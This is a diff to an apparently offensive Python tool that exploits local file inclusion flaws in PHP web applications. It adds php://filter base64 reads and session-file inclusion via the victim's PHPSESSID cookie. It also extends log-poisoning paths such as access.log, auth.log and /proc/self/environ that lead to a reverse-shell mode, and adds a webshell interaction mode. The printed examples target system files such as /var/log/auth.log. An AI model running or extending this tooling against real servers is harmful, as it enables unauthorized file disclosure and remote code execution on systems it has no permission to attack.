@@ -162,18 +162,24 @@ class Read_File:
                     LINE.replace('\n','')
                     self.LFi = ''
                     if self.args.base64:
-                        phpfillter = 'php://filter/read=convert.base64-encode/resource='
-                        URL = self.args.Vulnurl+ phpfillter   
+                        if 'sess_' not in self.args.read :
+                            phpfillter = 'php://filter/read=convert.base64-encode/resource='
+                            self.LFI = self.args.Vulnurl.split("=")[0]+"="+ phpfillter+LINE
+                        else:
+                            self.LFI= self.args.Vulnurl.split("=")[0]+"="+ phpfillter+LINE.replace('\n','')+str("".join(re.findall(r"PHPSESSID=([a-z0-9]+)",self.Cookie)))  
+                    elif "sess_" in self.args.read: 
+                        self.LFI = self.args.Vulnurl+LINE.replace('\n','')+self.args.read+str("".join(re.findall(r"PHPSESSID=([a-z0-9]+)",self.Cookie)))         
                     else:    
                         URL = self.args.Vulnurl 
-                    if '//' in LINE and not 'file' in LINE:  
-                        self.LFI =URL+LINE+self.args.read.replace('/','//')
-                    elif '%2f' in LINE  :
-                          self.LFI = URL+LINE+self.args.read.replace('/','%2f')
-                    elif 'file:' in LINE :
-                         self.LFI = URL+LINE+self.args.read.replace('/','',1)       
-                    else:
-                        self.LFI = (URL+LINE+self.args.read).replace('\n','')                                                                                               
+                    if not "sess_" in self.args.read:    
+                        if '//' in LINE and not 'file' in LINE:  
+                            self.LFI =URL+LINE+self.args.read.replace('/','//')
+                        elif '%2f' in LINE  :
+                              self.LFI = URL+LINE+self.args.read.replace('/','%2f')
+                        elif 'file:' in LINE :
+                             self.LFI = URL+LINE+self.args.read.replace('/','',1)       
+                        else:
+                            self.LFI = (URL+LINE+self.args.read).replace('\n','')                                                                                               
                     self.url = self.LFI
                     request = mechanize.Browser()
                     request.set_handle_robots(False)
@@ -185,8 +191,8 @@ class Read_File:
                                  ('username',f"{self.args.user}"),
                                  ('password',f'{self.args.password}')]
                     try: 
-                      self._first_req = request.open(self.args.Vulnurl).read()                                                      
-                      self.Get_Oregnal_URL = request.open(self.url).read() 
+                      self._first_req = request.open(self.args.Vulnurl,timeout=5).read()                                                      
+                      self.Get_Oregnal_URL = request.open(self.url,timeout=5).read() 
                     except Exception  as e :
                          print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                          print("[*] Error : ",e )
@@ -230,7 +236,8 @@ class Read_File:
                            if self.args.shell :
                                 if  "auth" in  self.url or "auth.log" in  self.url\
                                 or "environ" in self.url or "environ" in self.url \
-                                or "/apache2/php.ini" in self.url \
+                                or "/apache2/php.ini" in self.url or "access.log" in self.url\
+                                or "access" in self.url \
                                 or  "fpm/php.ini" in self.url or 'sessions' in self.url:  
                                     print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
                                     time.sleep(1)
@@ -265,7 +272,13 @@ class Read_File:
                                       print("[*] Example : --read /var/log/auth.log ")
                                       print("[*] Example : --read /proc/self/environ")
                                       print("[*] Example : --read /var/log/auth")
-                                      exit()            
+                                      exit()  
+                           elif self.args.webshell:
+                                with open('./Package/shell/.FileWebInfo.txt',"a") as dataurl:
+                                    dataurl = dataurl.write("self.url ="+self.url)
+                                from Package.webshell import WebShellInteract
+                                WebShellInteract.WebShell(self,**kwargs) 
+                                exit()                     
                            else:
                                 exit()   
                     elif not self.args.auth and len(self.Get_Oregnal_URL) > len(self._first_req):
@@ -286,7 +299,9 @@ class Read_File:
                            if self.args.shell :
                                 if  "auth" in  self.url or "auth.log" in  self.url\
                                 or "environ" in self.url or "/apache2/php.ini" in self.url \
-                                or  "fpm/php.ini" in self.url or 'sessions' in self.url: 
+                                or  "fpm/php.ini" in self.url or 'sessions' in self.url\
+                                or "access.log" in self.url\
+                                or "access" in self.url: 
                                     print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
                                     time.sleep(1)
                                     print("[+] Attack type          : ................ | : Reverse-Shell") 
@@ -320,7 +335,13 @@ class Read_File:
                                       print("[*] Example : --read /var/log/auth.log ")
                                       print("[*] Example : --read /proc/self/environ")
                                       print("[*] Example : --read /var/log/auth")
-                                      exit()            
+                                      exit()    
+                           elif self.args.webshell:
+                                with open('./Package/shell/.FileWebInfo.txt',"a") as dataurl:
+                                    dataurl = dataurl.write("self.url ="+self.url)
+                                from Package.webshell import WebShellInteract
+                                WebShellInteract.WebShell(self,**kwargs) 
+                                exit()                   
                            else:
                                 exit()   
                 print('\n'+'='*20+"\n[*] RESUITE-INFO "+'\n'+'='*30+'\n')
@@ -351,7 +372,6 @@ class Read_File:
         with open (".RQData",'w')as RQ :
              RQ.write(str(self._first_req))   
    except Exception  as a :
-
         print(a)                                       
 if __name__=='__main__':
    Read_File()    
